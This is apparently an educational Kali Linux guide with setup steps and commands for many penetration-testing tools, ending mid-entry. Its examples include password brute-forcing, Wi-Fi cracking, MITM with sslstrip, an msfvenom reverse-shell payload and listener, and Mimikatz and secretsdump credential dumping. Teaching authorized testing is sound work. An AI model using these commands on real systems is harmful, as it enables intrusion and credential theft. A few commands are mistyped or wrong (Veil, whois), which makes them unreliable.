Section Two · From basics to tools

Kali Linux: Basics and Tools

Start with a terminal setup and basic installation, then a practical explanation of 100 tools in 12 categories: what the tool does, on what principle it operates, and when to use it — with basic operating commands. The content is educational and assumes you are working on systems you own or have permission to test.

In simple wordsKali is a Linux distribution with ready-made penetration-testing tools. Methodology matters more than the tool: gather, scan, exploit, document — only on systems you may test.
Basics before any command 100 tools 12 categories Level: Beginner → Intermediate
⚙️ Start here — before anything

Kali Linux basics

Before you open any tool or write your first line of code, you need to have your terminal ready: an up-to-date system, basic build tools, Python in an isolated environment, and Git configured. These steps are done once, and will save you hours of mistakes later.

01

Update the system first

Any outdated package can break the installation or cause a conflict. Start by updating the index and upgrading packages.

bash
sudo apt update
sudo apt full-upgrade -y
sudo apt autoremove -y
02

Build and essential tools

These are the packages you will need for most lessons: C/C++ compiler, Git, network tools, Python, and archive tools.

bash
sudo apt install -y build-essential git curl wget unzip zip jq \
  net-tools dnsutils python3 python3-pip python3-venv nano vim
03

Python in an isolated environment

Never install Python libraries directly on the system. Create a virtual environment for each project to prevent conflicts.

bash
python3 -m venv ~/.venvs/lab
source ~/.venvs/lab/bin/activate
python -m pip install --upgrade pip
04

Git and identity

Set your name and email once; every commit will be recorded with them. We will explain Git in full in the section after languages.

bash
git config --global user.name "your-name"
git config --global user.email "you@example.com"
git config --global init.defaultBranch main
05

Check everything before you start

Run these commands and make sure each tool reports a version number. If a command is not present, install its package from step 02.

bash
python3 --version
pip --version
git --version
gcc --version
curl --version
dig -v

Terminal basics you need to know

pwd · ls · cd

Navigation

pwd displays your current path, ls -la displays hidden files, and cd navigates between folders.

man · --help

Ask for help

Before any new command, read man <command> or <command> --help. This is better than copying commands you do not understand.

Tab · Ctrl+C · Ctrl+L

Quick control

Tab completes names, Ctrl+C stops a pending command, and Ctrl+L clears the screen.

Common errors and their solutions

The messageMeaningSolution
command not foundThe command or package is not installed.Install the package: sudo apt install <package>
Permission deniedIt requires higher privileges.Rerun the command with sudo — and never use sudo pip.
Could not get lockAnother apt process is running in the background.Wait for it to finish, or execute sudo dpkg --configure -a.
externally-managed-environmentpip is trying to modify the system Python.Create a virtual environment with python3 -m venv and install inside it.
Temporary failure resolvingDNS or network connection problem.Check with ip a then ping 1.1.1.1.
A golden rule before any experiment:

Run inside a virtual machine (VM) and take a Snapshot before any modification. Don't run everything as root — use sudo only when needed, and read the command before you execute it. If you don't understand something, ask or research before operating.

Legal and ethical warning: All the tools here are for authorized penetration testing, learning within your labs or training platforms like TryHackMe and HackTheBox. Performing any scan or exploit against a system you do not own or without written authorization is a crime punishable by law. Do not share commands targeting third party systems.
🧭 Before you open any tool

Penetration testing methodology in 6 stages

The tool is not the test. The professional proceeds in an orderly manner: understands the goal, collects information, examines, exploits, proves the effect, and then writes a report. Jumping straight into an exploit is the quickest path to failure — or legal liability.

StageGoalTools from the guide
1. ReconGather publicly available information: subdomains, emails, technologies, and accounts.theHarvester · Amass · dnsenum · fierce · Sherlock
2. ScanningLive devices, open ports, services and their versions.Nmap · masscan · arp-scan · hping3 · enum4linux
3. Vulnerability analysisCompare detected services with known vulnerabilities and determine priorities.OpenVAS · Nikto · Wapiti · nuclei · searchsploit
4. ExploitationProve exploitability with the least possible impact on the service.Metasploit · SQLmap · Burp Suite · Hydra · commix
5. Post-exploitationMeasure reach: permissions, traffic within the network, and exposed data.BloodHound · Responder · NetExec · smbclient
6. Report and clean upDocument what was done, remove sessions and files, then recommend remediations.Your notes + screenshots + command logs

Scope

Know exactly what you are allowed to test: domains, IP addresses, and the type of test. Anything outside the scope is prohibited.

Record every step

Save commands, timestamps, and results. A report without evidence is worthless.

Do no harm

Start with minimal impact: light scan before exploitation, and test on a clone or test environment when possible.

Before the first command:

Set up a virtual machine and take a Snapshot, record the start time, and confirm authorization. If testing on a real network, agree on a time window with the system owner so as not to disrupt the operations team.

💡 Click a category name to open or close it 🔎 Inside each tool: “Learn about” and “How to run” 100 tools in total
theHarvester1
BeginnerMulti-platformAlternative: Amass

An OSINT tool: it searches search engines and public sources for emails, subdomains, and names associated with a specific domain, without directly contacting the site itself.

Change example.com to the domain you want to collect information about.

# Install
sudo apt install theharvester
# -d the domain  -b search sources  -l number of results
theHarvester -d example.com -b duckduckgo,crtsh -l 200
Maltego2
IntermediateMulti-platformAlternative: SpiderFoot

A program that turns information into a visual graph: enter a domain, email, or person and it draws a map linking them (domains, addresses, accounts) so you can see the relationships at a glance.

After launching, you will create a free account once, then drag “Entity” from the side menu and start linking data.

# Install
sudo apt install maltego
# Run
maltego
Amass3
IntermediateMulti-platformAlternative: subfinder

It specializes in discovering subdomains: it collects names from public sources and performs active checks (DNS and others) to build the largest possible list of subdomains for a given site.

The result will show you a list of all the subdomains it found.

# Install
sudo apt install amass
# enum = enumeration mode, -d the domain
amass enum -d example.com
Sherlock4
BeginnerMulti-platformAlternative: Maigret

Give it one username and it searches hundreds of social media sites and accounts at once, telling you where the name exists and where it does not.

Change username123 to the username you are looking for. Install pipx first if it is missing: sudo apt install pipx.

# Install
pipx install sherlock-project
# Usage
sherlock username123
dnsenum5
BeginnerLinuxAlternative: dnsrecon

DNS reconnaissance tool: collects domain records (A, MX, NS, TXT), tests zone transfer, and extracts subdomains from listings and search sources — a snapshot of the domain structure.

Change example.com to the domain you have permission to inspect.

# Install
sudo apt install dnsenum
# Full reconnaissance of the domain
dnsenum example.com
fierce6
BeginnerLinuxAlternative: dnsrecon

A complementary tool for subdomain discovery: starts from the primary domain, tries common names, and attempts a zone transfer if the DNS server allows it — useful for defining target boundaries.

Use --domain to specify the domain; the result appears directly in the terminal.

# Install
sudo apt install fierce
# Subdomain discovery
fierce --domain example.com
arp-scan7
BeginnerLinuxAlternative: netdiscover

A quick tool for discovering devices connected to your local network: sends an ARP request; for every device that responds, you learn its IP, MAC address, and manufacturer. The first step before any network scan — for networks that you own or are authorized to scan.

Change eth0 to the name of your network card (identify it as ip a).

# Install
sudo apt install arp-scan
# Scan the entire local network
sudo arp-scan --interface=eth0 --localnet
subfinder8
BeginnerLinuxAlternative: Amass

Fast tool for discovering subdomains from passive sources: it collects names from SSL certificates, search engines, and archive services without sending any direct request to the target. Suitable as the first step in reconnaissance.

Change example.com to the domain you have permission to inspect.

# Install
sudo apt install subfinder
# -d the domain  -silent results only
subfinder -d example.com -silent
whois9
BeginnerLinuxAlternative: dnsenum

A tool for querying domain registration data: owner, creation and expiration dates, DNS servers, and contacts. Useful for initial reconnaissance before any testing.

Use whois on the domain or IP address directly.

#install
sudo apt install whois
# Domain information
whoisexample.com
# IP address information
whois 8.8.8.8
dnsx10
IntermediateLinux · macOSAlternative: dnsenum

Fast tool for bulk DNS queries: convert a list of subdomains to IP addresses, inspect A/AAAA/CNAME records, and filter results before passing them to other tools.

Prepare a file containing the subdomains, one per line.

#install
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
# Query A records
cat subs.txt | dnsx -a -resp
# CNAME records
dnsx -cname -l subs.txt
httpx11
IntermediateMulti-platformAlternative: whatweb

Quick scan of HTTP/HTTPS services: response status, page title, technologies used, and certificate. It speeds up verification of live domains.

Use -title and -tech-detect to print the title and technologies.

#install
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
# Check list of ranges
httpx -l subs.txt -title -tech-detect -status-code
# Check one link
httpx -u https://example.com -title
Nmap1
EssentialMulti-platformAlternative: masscan

Network scanner: It sends probes to the address you specify and shows the open ports, the services running on it, and sometimes the type of operating system. It is useful as a first step to understand the layout of the network before any deeper examination.

Replace 192.168.1.10 with the address of the device you want to scan.

# Install
sudo apt install nmap
# A simple host scan (find the open ports)
nmap 192.168.1.10
# Detailed scan (-sV services, -O OS, -p- all ports)
sudo nmap -sV -O -p- 192.168.1.10
masscan2
IntermediateLinuxAlternative: Nmap

Very fast port scanner: Sends raw packets and covers large IP ranges in minutes. Use it in the first stage to identify open ports, and then scan them in detail with Nmap.

Reduce --rate on sensitive networks to avoid congestion.

# Install
sudo apt install masscan
# Scan the first 1000 ports across a whole network at a set rate
sudo masscan 192.168.1.0/24 -p1-1000 --rate=1000
hping33
AdvancedLinuxAlternative: nping

Manual packet crafting and sending tool: controls packet type (TCP/UDP/ICMP), flags, and port. Useful for understanding how packets work in practice, probing the firewall, and testing service responsiveness.

Replace the target address with 192.168.1.10. Use it with caution — crafted packets can look like an attack.

# Install
sudo apt install hping3
# Scan port 80 with SYN packets
sudo hping3 -S -p 80 -c 4 192.168.1.10
# ICMP test (like ping but with full control)
sudo hping3 --icmp -c 4 192.168.1.10
enum4linux4
IntermediateLinuxAlternative: NetExec

Enumerator for SMB services on Windows and Samba: extracts usernames, shares, password policy, and domain information — often without credentials.

Replace 192.168.1.20 with the address of the target device you are authorized to scan.

# Install
sudo apt install enum4linux
# Full enumeration of all information
enum4linux -a 192.168.1.20
netdiscover5
BeginnerLinuxAlternative: arp-scan

ARP-based device discovery tool: it sends requests to all local addresses and collects responses from live devices with their MAC address and manufacturer. Faster than regular IP scanning on a local network.

Use -r to specify the network range, or -p if you want passive operation without transmission.

# Install
sudo apt install netdiscover
# Scan the local network
sudo netdiscover -r 192.168.1.0/24
rustscan6
IntermediateLinuxAlternative: masscan

Port scanner written in Rust: scans all ports in seconds, then automatically passes open ports to Nmap for service analysis. It combines the speed of masscan with the depth of Nmap.

Everything after -- goes straight to Nmap.

# Install
sudo apt install rustscan
# Fast scan, then service analysis
rustscan -a 192.168.1.10 -- -sV
zmap7
AdvancedLinuxAlternative: masscan

A high-speed Internet scanner for very large ranges (millions of addresses) on one or more ports, used for broad security measurements.

Use -p for the port and -r for the rate, and start with a small network before expanding.

#install
sudo apt install zmap
# Scan port 443 in range
sudo zmap -p 443 -o results.txt 192.168.1.0/24
naabu8
IntermediateLinux · macOSAlternative: Nmap

ProjectDiscovery's fast SYN/CONNECT port scanner detects open ports before passing them to other scanners.

Use -top-ports for a quick scan or -p to specify specific ports.

#install
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
# Scan the most important ports
naabu -host example.com -top-ports 100
# Specified range
naabu -host 192.168.1.10 -p 22,80,443
OpenVAS1
IntermediateLinuxAlternative: Nessus

A comprehensive vulnerability scanner: it scans a device or network, compares versions and settings against a database of known vulnerabilities, and produces a report on the severity of each issue.

The modern package is called gvm (formerly OpenVAS). After launching, open the link in the browser, log in, and start a new scan on the target address.

# First-time install and setup
sudo apt install gvm
sudo gvm-setup
# Run
sudo gvm-start
# Web interface: https://127.0.0.1:9392
Nikto2
BeginnerLinuxAlternative: Wapiti

Web server scanner: looks for dangerous files and settings, old versions, and paths with known security problems on the server itself.

Replace target.com with the URL you have permission to scan.

# Install
sudo apt install nikto
# -h = the target
nikto -h http://target.com
Wapiti3
BeginnerMulti-platformAlternative: Nikto

Web application scanner: it crawls pages and forms automatically, tries common attack types such as SQL injection and XSS, and records the results in a report.

It will take time depending on the size of the site, and the report is written to a file automatically.

# Install
sudo apt install wapiti
# -u = the site URL
wapiti -u http://target.com
nuclei4
IntermediateMulti-platformAlternative: Nikto

Fast vulnerability scanner based on YAML templates: each template describes a request and its success condition, so you can scan thousands of targets for specific vulnerability types or run all templates.

Use -severity to filter by severity, -u for a single target, and -l for a targets file.

# Install
sudo apt install nuclei
# Scan a target for high-severity vulnerabilities only
nuclei -u https://target.com -severity critical,high
Lynis5
AdvancedLinuxAlternative: OpenVAS

System security audit tool: checks kernel settings, permissions, SSH, and the firewall, and suggests improvements with clear hardening advice.

Run it as root and read the report in /var/log/lynis.log.

#install
sudo apt install lynis
# System audit
sudo lynis audit system
# Show warnings
sudo lynis show warnings
Vuls6
AdvancedLinuxAlternative: OpenVAS

A data-driven CVE/NVD vulnerability scanner covering Linux packages and applications, with exportable reports and scan-to-scan comparison.

It requires initial setup and an updated vulnerability database.

#install
sudo apt install vuls
# Offer help
vuls --help
# Local scan after setup
vuls scan
vuls report
JoomScan7
IntermediateLinuxAlternative: WPScan

A dedicated tool for checking Joomla websites: version, vulnerable components and extensions, and exposed admin paths.

Specify the full site URL without a trailing slash.

#install
sudo apt install joomscan
# Check Joomla website
joomscan -u https://example.com
# Save the report
joomscan -u https://example.com -ec
Burp Suite1
IntermediateMulti-platformAlternative: OWASP ZAP

A proxy between the browser and the site: Every request and response passes through it, so you can inspect and modify it before it reaches the server. Suitable for careful manual testing of web vulnerabilities.

After launching, go to the browser settings and set the proxy manually to 127.0.0.1:8080.

# Install
sudo apt install burpsuite
# Run
burpsuite
OWASP ZAP2
BeginnerMulti-platformAlternative: Burp Suite

Free web scanner: it performs automatic site scanning (crawling + vulnerability testing) from a graphical interface and is a free, open-source alternative to Burp, especially for automated scanning.

From the program interface, enter the website URL and click “Attack” to start the automatic scan.

# Install
sudo apt install zaproxy
# Run
zaproxy
SQLmap3
IntermediateMulti-platformAlternative: None

It discovers and exploits SQL injection vulnerabilities: give it a URL with parameters and it tries different injection techniques. If it finds a vulnerability, it can extract the names of databases, tables, and data.

--dbs lists database names; use --tables to list the tables in a specific database.

# Install
sudo apt install sqlmap
# -u = the URL, --dbs = list the databases
sqlmap -u "http://target.com/page?id=1" --dbs
Gobuster4
BeginnerLinuxAlternative: ffuf

It examines wordlists of folder and file names on a site to discover hidden paths (control panels, backups, configuration files) that are not visible in regular links.

dir = directory scanning mode, -w = wordlist file.

# Install
sudo apt install gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
WPScan5
BeginnerLinuxAlternative: None

Specialized in WordPress: detects the version, plugins, themes, users, and their known vulnerabilities on the target site.

vp, vt, u mean: vulnerable plugins, vulnerable themes, and usernames. Vulnerability details require a free API token from wpscan.com.

# Install
sudo apt install wpscan
wpscan --url http://target.com --enumerate vp,vt,u
ffuf6
IntermediateLinuxAlternative: Gobuster

Fast web fuzzing tool: places a word from the wordlist at the FUZZ position in the URL, header or parameter, and filters the results by response code or size to discover hidden paths and parameters.

-w wordlist file, -u URL with FUZZ, -fc to exclude certain status codes.

# Install
sudo apt install ffuf
# Discover hidden paths
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ
whatweb7
BeginnerLinuxAlternative: Wappalyzer

Technical fingerprint of the site: identifies the server, programming language, CMS, library versions, and sometimes visible settings — without checking for vulnerabilities.

-a 3 for deeper analysis, -v for a detailed view.

# Install
sudo apt install whatweb
# Technology fingerprint
whatweb -a 3 http://target.com
commix8
AdvancedLinuxAlternative: None

An automated tool for exploiting command injection vulnerabilities: it detects inputs that reach system commands and attempts to exploit them interactively or automatically.

--url A URL with a suspicious parameter; the tool tests it automatically.

# Install
sudo apt install commix
# Test the ip parameter
commix --url="http://target.com/page.php?ip=127.0.0.1"
wafw00f9
BeginnerLinuxAlternative: whatweb

A tool that identifies the web application firewall (WAF) in front of a site: it sends suspicious requests and inspects the response to determine whether it is Cloudflare, Akamai, or ModSecurity. Important before any web test because it shows what the firewall can block.

-a tests all fingerprints; some sites require a valid User-Agent.

# Install
sudo apt install wafw00f
# Detect the web application firewall
wafw00f -a https://example.com
XSStrike10
IntermediateLinuxAlternative: Burp Suite

XSS vulnerability scanner: analyzes parameters and filters, and tests different payloads to see which inputs are reflected on the page without filtering. It shows the confidence level and reason for suspicion before manual confirmation.

Only test on an app that you own or are authorized to test.

# Install
git clone https://github.com/s0md3v/XSStrike && cd XSStrike
pip install -r requirements.txt
# -u the target URL
python3 xsstrike.py -u "https://example.com/search?q=test"
dirb11
BeginnerLinuxAlternative: Gobuster

A classic tool for discovering hidden paths and files via a word list, and supports custom extensions and files.

Start with the default common.txt wordlist and expand from there.

#install
sudo apt install dirb
# Check paths
dirb https://example.com
# Custom menu and extensions
dirb https://example.com /usr/share/wordlists/dirb/common.txt -X .php,.html
Dalfox12
IntermediateLinux · macOSAlternative: XSStrike

Fast XSS scanner that detects injection points and generates appropriate payloads, supports DOM inspection and result verification to reduce false positives.

Use --skip-bav to speed up the initial scan.

#install
go install github.com/hahwul/dalfox/v2@latest
# Check link
dalfox url https://example.com/search?q=test
# Check the list of links
dalfox file urls.txt --skip-bav
Arjun13
IntermediateMulti-platformAlternative: ffuf

A tool to discover hidden HTTP parameters that do not appear in links, via word lists and GET/POST requests.

Use -m GET or POST depending on the endpoint.

#install
pip install arjun
# Discover transactions
arjun -u https://example.com/api -m GET
# POST request
arjun -u https://example.com/api -m POST
Hydra1
IntermediateMulti-platformAlternative: Medusa

Online password guessing attack: try a username/password list against a service such as SSH, FTP, or HTTP until you find the right combination or exhaust the list.

-l = username, -P = password wordlist file.

# Install
sudo apt install hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
John / Hashcat2
IntermediateMulti-platformAlternative: None

Offline password cracking (hashes): John and Hashcat take a hash file and a wordlist, and test candidates until one matches the hash. Hashcat is faster because it takes advantage of the graphics card.

-m 0 means the hash type is MD5; change it according to the hash you have.

# Install
sudo apt install john hashcat
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
CeWL3
BeginnerLinuxAlternative: None

Builds a custom word list from the site's own words: it crawls the pages and collects useful words, so the list is closer to potential passwords than general lists.

-w = name of the output file where the words are saved.

# Install
sudo apt install cewl
cewl http://target.com -w wordlist.txt
crunch4
BeginnerLinuxAlternative: None

Password list generator: specify the length and character set, and it generates all possibilities or a specific pattern — useful for testing password-policy strength within an authorized scope.

8 8 = minimum and maximum length, abc123 = character set, -o = output file.

# Install
sudo apt install crunch
# Generate every 8-character word from abc123
crunch 8 8 abc123 -o wordlist.txt
medusa5
IntermediateLinuxAlternative: Hydra

Parallel online password guessing tool: it works against many services (SSH, FTP, HTTP, SMB) and can try several targets at once.

-h target, -u username, -P password file, -M service type.

# Install
sudo apt install medusa
# SSH guessing
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh
hashid6
BeginnerLinuxAlternative: hash-identifier

Identifies a hash type from its shape and length: give it a hash and it returns the possible types (MD5, SHA-1, bcrypt, NTLM...) with notes on each — a first step before cracking or verifying it.

Enclose the hash in quotation marks if it contains special characters.

# Install
sudo apt install hashid
# Identify the hash type
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Show every possible type
hashid -m '5f4dcc3b5aa765d61d8327deb882cf99'
kerbrute7
IntermediateLinuxAlternative: Hydra

Tool for testing the Kerberos protocol in Active Directory environments: enumerate valid users and try passwords against the service, faster and quieter than traditional SMB attempts.

For lab use only; do not use it on a network you do not own.

# Install
sudo apt install kerbrute
# Enumerate users
kerbrute userenum --dc 10.10.10.10 -d example.local users.txt
Patator8
AdvancedLinuxAlternative: Hydra

A flexible guessing framework that supports FTP, SSH, HTTP, SMTP, and more, with control over requests, parallelism, and response matching.

Review the modules with patator --help and start with a few attempts.

#install
sudo apt install patator
# Guess SSH
patator ssh_login host=192.168.1.10 user=admin password=FILE0 0=pass.txt -x ignore:mesg='Authentication failed.'
Ncrack9
IntermediateLinuxAlternative: Hydra

A fast password cracker that supports RDP, SSH, FTP, and MySQL while balancing speed and lockout avoidance.

Use -T to control speed and --user/--pass for credential lists.

#install
sudo apt install ncrack
# Guess SSH
ncrack -vv --user admin -P pass.txt ssh://192.168.1.10
# Guess RDP
ncrack -vv --user admin -P pass.txt rdp://192.168.1.10
Aircrack-ng1
IntermediateLinuxAlternative: Wifite

Wi-Fi toolkit: enable monitor mode, capture the handshake when a device connects to the router, then attempt to crack the WPA/WPA2 key from the capture file using a wordlist.

You need a Wi-Fi card that supports “monitor mode”. These steps are sequential: activate, capture, crack.

# Install
sudo apt install aircrack-ng
# Enable monitor mode
sudo airmon-ng start wlan0
# Capture the packets
sudo airodump-ng wlan0mon
# Attempt the crack
aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
Wifite2
BeginnerLinuxAlternative: Aircrack-ng

It encapsulates Wi-Fi attacks in an automatic script: it selects the network, and it attempts to capture the handshake and crack the key with ready-made steps instead of executing every manual command.

It will show you all the nearby networks. Choose the network number and wait.

# Install
sudo apt install wifite
sudo wifite
Kismet3
IntermediateLinuxAlternative: airodump-ng

Passive monitoring of Wi-Fi networks and devices: It listens to signals without sending intrusive packets, and displays nearby networks and devices in a direct interface.

It will open a web interface from which you can follow the results, moment by moment.

# Install
sudo apt install kismet
sudo kismet
reaver4
AdvancedLinuxAlternative: bully

WPS security testing tool: attempts to exploit the WPS PIN on WPS-enabled routers and may succeed in extracting the WPA/WPA2 key — for use on your network only.

-i monitor-mode interface, -b target network MAC address, -vv more detail.

# Install
sudo apt install reaver
# Try WPS on a network you own
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
Airgeddon5
IntermediateLinuxAlternative: Wifite

Interactive interface that combines wireless tools (Aircrack-ng, hostapd, dnsmasq) into ready-made scenarios: reconnaissance, manual attack, and an evil-twin workshop.

Run it from a full-screen terminal with root privileges.

#install
sudo apt install airgeddon
# Play
sudo airgeddon
Fern Wifi Cracker6
BeginnerLinuxAlternative: Wifite

A graphical interface for testing Wi-Fi networks: discover networks, capture handshakes, and try wordlists.

You need a wireless card that supports monitoring mode.

#install
sudo apt install fern-wifi-cracker
# Play
sudo fern-wifi-cracker
Pixiewps7
AdvancedLinuxAlternative: reaver

A tool that exploits a WPS vulnerability to recover the PIN via a Pixie Dust attack and works with reaver/wash to speed up access-point testing.

Use it only on networks where you have permission to test it.

#install
sudo apt install pixewps
# Offer help
pixewps --help
# Example with reaver
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1
Wireshark1
IntermediateMulti-platformAlternative: tcpdump

Packet analyzer: captures network traffic on the card you choose and displays each packet in detail (protocol, addresses, content) so you can understand or examine the traffic.

Select the network card from the interface and click Start to begin capturing.

# Install
sudo apt install wireshark
sudo wireshark
Bettercap2
AdvancedLinuxAlternative: Ettercap

A framework for attacks on the local network: MITM interception, monitoring, and modification of traffic between devices from a flexible command line.

-iface = name of the network interface to use.

# Install
sudo apt install bettercap
sudo bettercap -iface eth0
Ettercap3
IntermediateLinuxAlternative: Bettercap

Classic MITM tool: It focuses on ARP Spoofing so that your device sits between two devices, receiving a copy of their traffic or intercepting it from the GUI or command line.

-G opens the graphical interface, from within which you select targets.

# Install
sudo apt install ettercap-graphical
sudo ettercap -G
mitmproxy4
IntermediateMulti-platformAlternative: Burp Suite

Interactive proxy for intercepting and analyzing HTTP/HTTPS traffic: displays requests and responses directly, lets you modify or resend them, and has a terminal and web interface.

--listen-port sets the listening port; then point the browser proxy at it.

# Install
sudo apt install mitmproxy
# Run the proxy on 8080
mitmproxy --listen-port 8080
tcpdump5
IntermediateLinux · macOSAlternative: Wireshark

Terminal Packet Capture Tool: Displays each packet that passes through the network card, or saves it in a pcap file that you then open with Wireshark. Lighter and faster than graphical interfaces and suitable for servers.

You always need sudo. Use -w to save the file and -r to read it.

# Install
sudo apt install tcpdump
# Show packets on the eth0 card
sudo tcpdump -i eth0
# Filter on port 80 and save the result to a file
sudo tcpdump -i eth0 port 80 -w capture.pcap
# Read the file afterwards
tcpdump -r capture.pcap
dsniff6
IntermediateLinuxAlternative: Bettercap

Network Traffic Analysis Toolkit: Captures login data from legacy unencrypted protocols (FTP, Telnet, HTTP) and explains why HTTPS and SSH should always be used.

Change eth0 to the name of your network card (identify it as ip a).

# Install
sudo apt install dsniff
# Capture the network card's traffic
sudo dsniff -i eth0
netsniff-ng7
AdvancedLinuxAlternative: tcpdump

High-performance networking toolset: packet capture, replay, traffic generation, and bandwidth measurement.

Use netsniff-ng -i for capture and trafgen for packet generation.

#install
sudo apt install netsniff-ng
# Capture packets
sudo netsniff-ng -i eth0 -o capture.pcap
# Read the file
netsniff-ng -i capture.pcap
sslstrip8
AdvancedLinuxAlternative: Bettercap

A man-in-the-middle attack tool that converts HTTPS links to HTTP and strips redirects, to test for missing HSTS and transport protection.

ARP redirection is required before operation.

#install
sudo apt install sslstrip
# Run on port 10000
sudo sslstrip -l 10000
# With port 80 forwarding
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
Metasploit1
IntermediateMulti-platformAlternative: None

A powerful exploitation framework: it has ready-made modules (exploits, payloads, auxiliaries). You select the vulnerability, set the target address and settings, and run the module to attempt to access or execute code on the system.

search to find, use to select, set to configure, run to execute — in exactly this order.

# Install
sudo apt install metasploit-framework
msfconsole
msf6 > search [vulnerability name]
msf6 > use [exploit/path]
msf6 > set RHOSTS 192.168.1.10
msf6 > run
Netcat2
EssentialMulti-platformAlternative: socat

A simple, powerful networking tool: open a TCP/UDP connection, listen on a port, send or receive data, transfer files, or connect a reverse shell — a networking Swiss Army knife.

-l = listening mode, -v = more details, -n = no DNS lookup, -p = port number.

# Install
sudo apt install netcat-traditional
nc -lvnp 4444
searchsploit3
BeginnerLinuxAlternative: None

Local search of the Exploit-DB database: type the program name and version, and the tool lists the exploit files available on your device without needing the Internet.

Type the exact software name and version number for the best result.

# Install
sudo apt install exploitdb
searchsploit apache 2.4.49
Beef-XSS4
AdvancedLinuxAlternative: None

XSS exploitation framework: after injecting the hook script into a page, you control the browser from a control panel across the network — to test awareness only within an authorized environment.

After launching, open the control panel at http://127.0.0.1:3000 and log in.

# Install
sudo apt install beef-xss
# Run
sudo beef-xss
# Control panel: http://127.0.0.1:3000
SET5
IntermediateLinuxAlternative: Gophish

Social engineering toolkit: helps build phishing training pages or messages within a permissible scope, to measure users' awareness with official permission.

After launching, a numbered list will appear. Choose the type of attack you want.

# Install
sudo apt install set
setoolkit
Gophish6
IntermediateMulti-platformAlternative: SET

A platform for managing training phishing campaigns: design templates, send them to selected employees, and track who opens the email or clicks the link — for training use within organizations only.

Available in Kali repositories. Run it with gophish-start; the web interface is at https://127.0.0.1:3333. Recent versions generate a random password on first run and print it in the startup log; check it before signing in. Some older packages use admin / kali-gophish.

# Install
sudo apt install gophish
# Run
sudo gophish-start
# Interface: https://127.0.0.1:3333
msfvenom7
AdvancedLinuxAlternative: None

Metasploit payload generator: Builds a file or command that performs a reverse connection or opens a session, in different formats (exe, elf, apk, php…). For use in your laboratories and with express permission only.

LHOST is your address, and LPORT is the port where multi/handler will listen.

# List the available payloads
msfvenom -l payloads | grep linux
# Generate a reverse Linux payload in elf format
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf
# Start the listener in Metasploit
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; run"
evilginx28
AdvancedLinuxAlternative: SET

A reverse proxy used to simulate advanced phishing attacks: Provides a real login page and logs the session after authentication. A training tool for understanding the limitations of session protection and MFA.

For tutorial use only, in a lab environment with clear authorization.

# Install
sudo apt install evilginx2
# Run with a config folder
sudo evilginx2 -p ~/.evilginx
Veil9
AdvancedLinuxAlternative: msfvenom

A framework for generating test payloads with multiple formats and simple encryption to evade scanning, for use within an authorized laboratory only.

Use it inside an isolated lab and do not run it on systems without permission.

#install
sudo apt install veil
# Run the frame
sudo file
Empire10
AdvancedLinux · macOSAlternative: Metasploit

A post-exploitation framework that supports PowerShell/Python agents and multi-session management, with modules for deploying and controlling agents.

Start the server and then create a listener and a proxy.

#install
sudo apt install powershell-empire
# Run the server
sudo powershell-empire server
# Run the client in another terminal
sudo powershell-empire client
BloodHound1
AdvancedMulti-platformAlternative: None

Analyzes privilege paths in Active Directory: it collects user relationships, groups, and privileges and maps the shortest paths to high privileges such as Domain Admin.

After launching, the network data is loaded into the interface and you trace paths to Domain Admin.

# Install
sudo apt install bloodhound
sudo neo4j start && bloodhound
Responder2
AdvancedLinuxAlternative: None

It listens for name-resolution protocols on the network (such as LLMNR and NBT-NS): when a device asks for a name that does not exist, it answers and can capture authentication data (hashes) from Windows devices.

-I = the network interface to listen on.

# Install
sudo apt install responder
sudo responder -I eth0
NetExec3
IntermediateLinuxAlternative: CrackMapExec

The modern successor to CrackMapExec: a tool for managing and testing Windows and Active Directory networks over SMB, WinRM, and LDAP, collecting sessions, users, and permissions, and executing commands within an authorized scope.

nxc smb <network> -u <user> -p <password>. Use --help for the other protocols.

# Install
sudo apt install netexec
# Scan a local network with an authorised account
nxc smb 192.168.1.0/24 -u user -p 'password'
smbclient4
BeginnerLinuxAlternative: NetExec

Command-line client for SMB/CIFS shares: displays available shares on a machine, connects to one, and downloads or uploads files — like FTP for Windows and Samba networks. Useful in post-exploitation, with permission.

If the share requires a username and password, it will prompt for them.

# Install
sudo apt install smbclient
# List the available shares
smbclient -L //192.168.1.20 -N
# Connect to a specific share
smbclient //192.168.1.20/share -U user
chisel5
AdvancedMulti-platformAlternative: proxychains

TCP/UDP tunneling tool over HTTP: transports network traffic over a single allowed port and is used to understand how sessions travel between isolated networks and how firewalls restrict them.

The first command runs on the server, and the second on the target device.

# Install
sudo apt install chisel
# Server
chisel server -p 8080 --reverse
# Client
chisel client 10.10.10.10:8080 R:socks
Mimikatz6
AdvancedMulti-platformAlternative: NetExec

A popular tool for extracting credentials from Windows memory (LSASS) and Kerberos tickets, run via Wine or on a Windows target.

Use it only on systems that you have permission to test.

# Install Wine
sudo apt install wine
# Run the tool
wine mimikatz.exe
# Inside the tool
privilege::debug
sekurlsa::logonpasswords
Impacket7
AdvancedMulti-platformAlternative: NetExec

Python toolkit for Windows protocols (SMB, WMI, Kerberos), including psexec, secretsdump, and GetUserSPNs.

Install them via pip and use -h with each tool.

#install
pip install impacket
# Extract credentials
impacket-secretsdump domain/user:password@192.168.1.10
# Execute an order
impacket-psexec domain/user:password@192.168.1.10
Autopsy1
IntermediateMulti-platformAlternative: None

Disk forensics platform: mounts a disk image and reviews deleted files, browsing history, and logs to trace user activity or recover evidence.

From the interface, go to “New Case” and load the disk image you want to analyze.

# Install
sudo apt install autopsy
autopsy
Volatility32
AdvancedMulti-platformAlternative: None

